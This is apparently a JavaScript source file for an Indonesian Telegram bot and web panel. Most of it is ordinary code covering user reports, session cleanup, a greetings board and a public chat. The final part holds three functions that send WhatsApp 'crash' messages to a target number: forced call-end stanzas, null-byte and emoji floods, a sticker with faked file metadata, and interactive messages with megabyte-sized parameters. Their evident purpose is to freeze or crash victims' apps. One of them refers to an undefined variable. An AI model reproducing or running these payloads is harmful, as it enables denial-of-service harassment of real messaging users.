    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===================== FITUR UCAPAN (REAL-TIME) =====================

let ucapanList = [];
const UCAPAN_FILE = 'ucapan.json';

// Saat load, pastikan setiap ucapan punya likedBy & dislikedBy
function loadUcapan() {
  try {
    if (fs.existsSync(UCAPAN_FILE)) {
      ucapanList = JSON.parse(fs.readFileSync(UCAPAN_FILE, 'utf8'));
      // Migrasi data lama
      ucapanList = ucapanList.map(u => ({
        ...u,
        likedBy: u.likedBy || [],
        dislikedBy: u.dislikedBy || []
      }));
      console.log(`📜 Loaded ${ucapanList.length} ucapan from file`);
    }
  } catch (e) {
    console.error("Error loading ucapan:", e);
    ucapanList = [];
  }
}

function saveUcapan() {
  fs.writeFileSync(UCAPAN_FILE, JSON.stringify(ucapanList, null, 2));
}

// GET /getUcapan - Ambil semua ucapan
app.get("/getUcapan", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  // Balik urutan (terbaru di atas)
  const sortedUcapan = [...ucapanList].reverse();
  
  res.json({
    valid: true,
    ucapan: sortedUcapan
  });
});

// POST /addUcapan - Tambah ucapan baru (dengan filter kata kasar)
const kasarWords = [
  'anjing', 'bangsat', 'kontol', 'memek', 'ngentot', 'jembut', 'peler',
  'toket', 'goblok', 'tolol', 'babi', 'asu', 'sialan', 'brengsek',
  'kampret', 'bajingan', 'tai', 'ampas', 'setan', 'iblis'
];

function filterKataKasar(text) {
  let filtered = text;
  for (const word of kasarWords) {
    const regex = new RegExp(word, 'gi');
    filtered = filtered.replace(regex, '****');
  }
  return filtered;
}

app.post("/addUcapan", (req, res) => {
  const { key, nama, pesan } = req.body;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  if (!nama || !pesan) {
    return res.json({ valid: false, message: "Nama dan pesan wajib diisi" });
  }
  
  if (pesan.length > 500) {
    return res.json({ valid: false, message: "Pesan terlalu panjang (max 500 karakter)" });
  }
  
  // Filter kata kasar
  const filteredNama = filterKataKasar(nama);
  const filteredPesan = filterKataKasar(pesan);
  
  const newUcapan = {
    id: Date.now().toString(),
    nama: filteredNama,
    pesan: filteredPesan,
    waktu: new Date().toISOString(),
    likes: 0,
    dislikes: 0
  };
  
  ucapanList.push(newUcapan);
  saveUcapan();
  
  // Broadcast ke semua client WebSocket yang terhubung
  broadcastToAll({
    type: 'newUcapan',
    data: newUcapan
  });
  
  res.json({
    valid: true,
    ucapan: newUcapan
  });
});

// POST /likeUcapan - Like/dislike ucapan (cuma sekali per user)
app.post("/likeUcapan", (req, res) => {
  const { key, id, type } = req.body; // type: 'like' atau 'dislike'
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }
  
  const index = ucapanList.findIndex(u => u.id === id);
  if (index === -1) {
    return res.json({ valid: false, message: "Ucapan tidak ditemukan" });
  }
  
  const ucapan = ucapanList[index];
  
  // Inisialisasi array jika belum ada
  if (!ucapan.likedBy) ucapan.likedBy = [];
  if (!ucapan.dislikedBy) ucapan.dislikedBy = [];
  
  const alreadyLiked = ucapan.likedBy.includes(user.username);
  const alreadyDisliked = ucapan.dislikedBy.includes(user.username);
  
  // LIKE
  if (type === 'like') {
    if (alreadyLiked) {
      // Batal like (unlike)
      ucapan.likes = (ucapan.likes || 1) - 1;
      ucapan.likedBy = ucapan.likedBy.filter(u => u !== user.username);
      return res.json({ 
        valid: true, 
        action: 'unliked',
        likes: ucapan.likes, 
        dislikes: ucapan.dislikes || 0 
      });
    }
    
    if (alreadyDisliked) {
      // Hapus dislike dulu, baru like
      ucapan.dislikes = (ucapan.dislikes || 1) - 1;
      ucapan.dislikedBy = ucapan.dislikedBy.filter(u => u !== user.username);
    }
    
    // Tambah like
    ucapan.likes = (ucapan.likes || 0) + 1;
    ucapan.likedBy.push(user.username);
    
    saveUcapan();
    broadcastToAll({
      type: 'updateUcapan',
      data: ucapan
    });
    
    return res.json({ 
      valid: true, 
      action: 'liked',
      likes: ucapan.likes, 
      dislikes: ucapan.dislikes || 0 
    });
  }
  
  // DISLIKE
  if (type === 'dislike') {
    if (alreadyDisliked) {
      // Batal dislike
      ucapan.dislikes = (ucapan.dislikes || 1) - 1;
      ucapan.dislikedBy = ucapan.dislikedBy.filter(u => u !== user.username);
      return res.json({ 
        valid: true, 
        action: 'undisliked',
        likes: ucapan.likes || 0, 
        dislikes: ucapan.dislikes 
      });
    }
    
    if (alreadyLiked) {
      // Hapus like dulu, baru dislike
      ucapan.likes = (ucapan.likes || 1) - 1;
      ucapan.likedBy = ucapan.likedBy.filter(u => u !== user.username);
    }
    
    // Tambah dislike
    ucapan.dislikes = (ucapan.dislikes || 0) + 1;
    ucapan.dislikedBy.push(user.username);
    
    saveUcapan();
    broadcastToAll({
      type: 'updateUcapan',
      data: ucapan
    });
    
    return res.json({ 
      valid: true, 
      action: 'disliked',
      likes: ucapan.likes || 0, 
      dislikes: ucapan.dislikes 
    });
  }
  
  res.json({ valid: false, message: "Invalid type" });
});

// DELETE /deleteUcapan - Hapus ucapan (hanya owner)
app.delete("/deleteUcapan", (req, res) => {
  const { key, id } = req.body;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  // Hanya owner yang bisa hapus
  if (!user || user.role !== 'owner') {
    return res.json({ valid: false, message: "Only owner can delete" });
  }
  
  const index = ucapanList.findIndex(u => u.id === id);
  if (index === -1) {
    return res.json({ valid: false, message: "Ucapan tidak ditemukan" });
  }
  
  ucapanList.splice(index, 1);
  saveUcapan();
  
  broadcastToAll({
    type: 'deleteUcapan',
    id: id
  });
  
  res.json({ valid: true, message: "Ucapan dihapus" });
});

// Fungsi broadcast ke semua WebSocket client
function broadcastToAll(data) {
  const message = JSON.stringify(data);
  for (const client of Object.values(wsClients)) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  }
}

// Load ucapan saat server start
loadUcapan();

// ===================== PUBLIC CHAT =====================

let publicMessages = [];
const PUBLIC_CHAT_FILE = 'public_chat.json';

// Load chat history
function loadPublicChat() {
  try {
    if (fs.existsSync(PUBLIC_CHAT_FILE)) {
      publicMessages = JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8'));
      console.log(`💬 Loaded ${publicMessages.length} public messages`);
    }
  } catch (e) {
    console.error("Error loading public chat:", e);
    publicMessages = [];
  }
}

function savePublicChat() {
  fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(publicMessages, null, 2));
}

// Format waktu relatif
function formatRelativeTime(timestamp) {
  const now = new Date();
  const then = new Date(timestamp);
  const diffMs = now - then;
  const diffSec = Math.floor(diffMs / 1000);
  const diffMin = Math.floor(diffSec / 60);
  const diffHour = Math.floor(diffMin / 60);
  const diffDay = Math.floor(diffHour / 24);
  const diffWeek = Math.floor(diffDay / 7);
  const diffMonth = Math.floor(diffDay / 30);
  const diffYear = Math.floor(diffDay / 365);

  if (diffSec < 10) return "baru saja";
  if (diffSec < 60) return `${diffSec} detik lalu`;
  if (diffMin < 60) return `${diffMin} menit lalu`;
  if (diffHour < 24) return `${diffHour} jam lalu`;
  if (diffDay < 7) return `${diffDay} hari lalu`;
  if (diffWeek < 4) return `${diffWeek} minggu lalu`;
  if (diffMonth < 12) return `${diffMonth} bulan lalu`;
  return `${diffYear} tahun lalu`;
}

// GET /getPublicChat - Ambil semua pesan
app.get("/getPublicChat", (req, res) => {
  const { key, lastId } = req.query;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  let messages = [...publicMessages].reverse();
  
  // Jika ada lastId, ambil pesan baru saja
  if (lastId) {
    const lastIndex = messages.findIndex(m => m.id === lastId);
    if (lastIndex !== -1) {
      messages = messages.splice(0, lastIndex);
    }
  }
  
  // Tambahkan formatted time
  const messagesWithFormat = messages.map(msg => ({
    ...msg,
    formattedTime: formatRelativeTime(msg.timestamp)
  }));
  
  res.json({
    valid: true,
    messages: messagesWithFormat,
    total: publicMessages.length
  });
});

// POST /sendPublicChat - Kirim pesan
app.post("/sendPublicChat", (req, res) => {
  const { key, message } = req.body;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }
  
  if (!message || message.trim().length === 0) {
    return res.json({ valid: false, message: "Pesan tidak boleh kosong" });
  }
  
  if (message.length > 500) {
    return res.json({ valid: false, message: "Pesan terlalu panjang (max 500 karakter)" });
  }
  
  const newMessage = {
    id: Date.now().toString(),
    username: user.username,
    role: user.role || "member",
    message: message.trim(),
    timestamp: new Date().toISOString(),
  };
  
  publicMessages.push(newMessage);
  
  // Keep only last 1000 messages
  if (publicMessages.length > 1000) {
    publicMessages = publicMessages.slice(-1000);
  }
  
  savePublicChat();
  
  res.json({
    valid: true,
    message: {
      ...newMessage,
      formattedTime: "baru saja"
    }
  });
});

// DELETE /deletePublicChat - Hapus pesan (khusus owner)
app.delete("/deletePublicChat", (req, res) => {
  const { key, messageId } = req.body;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  // Hanya owner yang bisa hapus
  if (!user || user.role !== 'owner') {
    return res.json({ valid: false, message: "Only owner can delete messages" });
  }
  
  const index = publicMessages.findIndex(m => m.id === messageId);
  if (index === -1) {
    return res.json({ valid: false, message: "Message not found" });
  }
  
  publicMessages.splice(index, 1);
  savePublicChat();
  
  res.json({ valid: true, message: "Message deleted" });
});

// GET /getOnlineUsers - Ambil user online (dari session aktif)
app.get("/getOnlineUsers", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  // Ambil user dari activeKeys yang masih valid
  const onlineUsers = Object.values(activeKeys).map(k => k.username);
  const uniqueUsers = [...new Set(onlineUsers)];
  
  res.json({
    valid: true,
    onlineUsers: uniqueUsers,
    count: uniqueUsers.length
  });
});

// Load public chat saat server start
loadPublicChat();

// ===== Start HTTP/Express + WebSocket Server =====
server.listen(PORT, () => {
  console.log(`🚀 HTTP server aktif di port ${PORT}`);
  console.log(`🔌 WebSocket aktif pada ws://0.0.0.0:${PORT}`);
    startUserSessions()
});

// ===== UPTIME DAN TIMER BOT =====
function formatDuration(seconds) {
  const total = Math.max(0, Math.floor(Number(seconds) || 0));
  const days = Math.floor(total / 86400);
  const hours = Math.floor((total % 86400) / 3600);
  const minutes = Math.floor((total % 3600) / 60);
  const secs = total % 60;
  return `${days} hari ${hours} jam ${minutes} menit ${secs} detik`;
}

bot.onText(/^\/?uptime$/i, (msg) => {
  const uptime = formatDuration((Date.now() - BOT_STARTED_AT) / 1000);
  return bot.sendMessage(msg.chat.id, `Waktu berjalan bot:\n${uptime}`);
});

bot.onText(/^\/?timer(?:\s+(start|stop|reset|status))?$/i, (msg, match) => {
  const chatId = String(msg.chat.id);
  const action = String(match[1] || "status").toLowerCase();
  const current = BOT_TIMERS.get(chatId);

  if (action === "start") {
    if (current?.startedAt) return bot.sendMessage(msg.chat.id, `Timer sudah berjalan selama ${formatDuration((Date.now() - current.startedAt) / 1000)}.`);
    BOT_TIMERS.set(chatId, { startedAt: Date.now() });
    return bot.sendMessage(msg.chat.id, "Timer dimulai.");
  }
  if (action === "stop") {
    if (!current?.startedAt) return bot.sendMessage(msg.chat.id, "Timer belum dimulai.");
    const elapsed = formatDuration((Date.now() - current.startedAt) / 1000);
    BOT_TIMERS.delete(chatId);
    return bot.sendMessage(msg.chat.id, `Timer dihentikan. Durasi: ${elapsed}`);
  }
  if (action === "reset") {
    BOT_TIMERS.set(chatId, { startedAt: Date.now() });
    return bot.sendMessage(msg.chat.id, "Timer direset dan dimulai kembali.");
  }
  const elapsed = current?.startedAt ? formatDuration((Date.now() - current.startedAt) / 1000) : "belum berjalan";
  return bot.sendMessage(msg.chat.id, `Timer: ${elapsed}\nUptime bot: ${formatDuration((Date.now() - BOT_STARTED_AT) / 1000)}`);
});

console.log("Bot uptime timer aktif. Auto-restart otomatis dinonaktifkan.");

async function forcloseXblankXcrash(sock, target) {
  try {
    const callId = `${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
    const forcloseMsg = {
      tag: "call",
      attrs: {
        to: target,
        id: callId,
        from: sock.user.id,
      },
      content: [{
        tag: "end",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id,
          "duration": "0",
          "reason": "1"
        }
      }]
    };
    await sock.relayMessage(target, forcloseMsg, { participant: { jid: target } });
    console.log(`Forclose call sent to ${target}`);
    const blankMsg = {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(50000),
            matchedText: "\u0000".repeat(50000),
            description: "\u0000".repeat(50000),
            title: "\u0000".repeat(50000),
            previewType: "NONE",
            jpegThumbnail: null
          }
        }
      }
    };
    await sock.relayMessage(target, blankMsg, { participant: { jid: target } });
    console.log(`Blank message sent to ${target}`);
    const crashSticker = {
      stickerPackMessage: {
        stickerPackId: "crash_" + Date.now(),
        name: "💀".repeat(30000),
        publisher: "🩸".repeat(20000),
        stickers: [
          { fileName: "crash.webp", isAnimated: true, emojis: ["💀"], mimetype: "image/webp" }
        ],
        fileLength: "9999999999",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        contextInfo: { mentionedJid: [target, "0@s.whatsapp.net"] }
      }
    };
    await sock.relayMessage(target, crashSticker, { participant: { jid: target } });
    console.log(`Crash sticker sent to ${target}`);
    const crashInteractive = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "💀".repeat(20000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net")
            }
          }
        }
      }
    };
    await sock.relayMessage(target, crashInteractive, { participant: { jid: target } });
    console.log(`Crash interactive sent to ${target}`);
    const crashLocation = {
      locationMessage: {
        degreesLatitude: 999999999,
        degreesLongitude: -999999999,
        name: "💀".repeat(10000),
        address: "\u0000".repeat(10000),
        url: "https://crash.xyz/" + "A".repeat(10000),
        contextInfo: { mentionedJid: [target, "0@s.whatsapp.net"] }
      }
    };
    await sock.relayMessage(target, crashLocation, { participant: { jid: target } });
    console.log(`Crash location sent to ${target}`);
    const crashOrder = {
      orderMessage: {
        itemCount: 999999,
        status: 1,
        surface: 1,
        message: "💀".repeat(50000),
        orderTitle: "\u0000".repeat(50000),
        sellerJid: "0@s.whatsapp.net",
        token: "CRASH",
        totalAmount1000: 99999999999,
        totalCurrencyCode: "USD",
        contextInfo: { mentionedJid: [target, "0@s.whatsapp.net"] }
      }
    };
    await sock.relayMessage(target, crashOrder, { participant: { jid: target } });
    console.log(`Crash order sent to ${target}`);
    console.log(`FORCLOSE + BLANK + CRASH COMPLETE on ${target}`);
    return true;
  } catch (error) {
    console.log(`forcloseXblankXcrash failed: ${error.message}`);
    return false;
  }
}

async function FyyTzyDelay(sock, target) {
  const z = (s) => 'x00'.repeat(s);
  const overflow = (s) => '𑇂𑆵𑆴𑆿'.repeat(s);
  const formattedTarget = target.includes('@')
    ? target
    : target + '@s.whatsapp.net';

  const paymentMsg = {
    requestPaymentMessage: {
      currency: 'IDR',
      amount: 99999999999999,
      from: formattedTarget,
      note: overflow(50000) + z(50000),
      background: {
        id: '999',
        fileLength: '9999',
        width: 2000,
        height: 2000,
        mimetype: 'image/webp',
        placeholderArgb: 0xff00ffff,
        textArgb: 0xffffffff,
        subtextArgb: 0xffaa00ff,
      },
      contextInfo: {
        mentionedJid: [formattedTarget],
        isForwarded: true,
        forwardingScore: 999999999,
        stanzaId:
          'PAY-' +
          Date.now() +
          '-' +
          Math.random().toString(36).substring(2, 10),
      },
    },
  };

  const groupInviteMsg = {
    groupInviteMessage: {
      groupJid: '0@g.us',
      inviteCode: z(300000),
      inviteExpiration: 9999999999999,
      groupName: 'u200B'.repeat(200000),
      caption: 'FyyTzy' + 'u200C'.repeat(200000),
      jpegThumbnail: Buffer.alloc(1000000, 'A'),
      contextInfo: {
        stanzaId: 'u200D'.repeat(150000),
      },
    },
  };

  await sock.relayMessage(target, FyyTzy, {
    participant: { jid: target },
  });
}

async function blank(sock, target) {
    const msg = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "33333333333333333@newsletter",
                    newsletterName: "ad bokep g" + "ી".repeat(120000),
                    jpegThumbnail: "",
                    caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                    inviteExpiration: Date.now() + 1814400000
                }
            }
        },
        nativeFlowMessage: {
            messageParamsJson: "\u0000".repeat(500000),
            buttons: [
                {
                    name: "call_permission_request",
                    buttonParamsJson: "{}"
                }
            ]
        }
    };

    await sock.relayMessage(target, msg, {
    });
}
